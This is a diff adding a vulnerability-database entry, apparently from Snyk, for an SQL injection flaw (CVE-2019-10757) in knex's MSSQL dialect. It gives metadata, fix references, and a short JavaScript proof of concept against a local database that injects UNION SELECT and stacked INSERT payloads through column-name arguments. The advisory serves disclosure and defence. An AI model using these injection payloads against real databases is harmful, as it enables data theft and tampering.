@@ -1,0 +1,34 @@
+---
+- id: snykio:maven:org.webjars.npm:knex:479857
+  title: SQL Injection
+  description: "[org.webjars.npm:knex][1] is a query builder for PostgreSQL, MySQL
+    and\nSQLite3\n\nAffected versions of this package are vulnerable to SQL Injection.\nIdentifiers
+    are escaped incorrectly as part of the MSSQL dialect,\nallowing attackers to craft
+    a malicious query to the host DB.\n\n*Note: Knex is not vulnerable when using
+    other dialects than MSSQL*\n\n### PoC   {#poc}\n\n    const knex = require('knex')({\n
+    \     client: 'mssql',\n      connection:{\n        port: 1433,\n        host:
+    '127.0.0.1',\n        password: 'yourStrong(!)Password',\n        user: 'sa',\n
+    \     },\n    });\n    \n    (async () => {\n      await knex.schema.createTableIfNotExists('projects',
+    (table) => {\n        table.increments();\n        table.string('name');\n      });\n
+    \     console.log(await knex('projects').where('id] = 1 UNION SELECT 1, @@version
+    -- --', 1));\n      console.log(await knex('projects').where('id', 1)\n        .orderBy('id];
+    INSERT INTO projects (name) VALUES (\\'abc\\'); -- --'));\n    })();\n\n\n\n[1]:
+    http://knexjs.org\n"
+  affected_package: org.webjars.npm:knex
+  vulnerable_versions:
+  - "< 0.19.5"
+  severity: high
+  package_manager: maven
+  cve:
+  - CVE-2019-10757
+  cwe:
+  - CWE-89
+  disclosed_date: 2019-10-07
+  created_date: 2019-10-07
+  last_modified_date: 2019-10-07
+  credit:
+  - Snyk Security Research Team
+  references:
+  - https://github.com/tgriesser/knex/commit/988fb243898d746a759d422762685a79eddf99ca
+  - https://github.com/tgriesser/knex/pull/3382
+  source_url: https://snyk.io/vuln/SNYK-JAVA-ORGWEBJARSNPM-479857
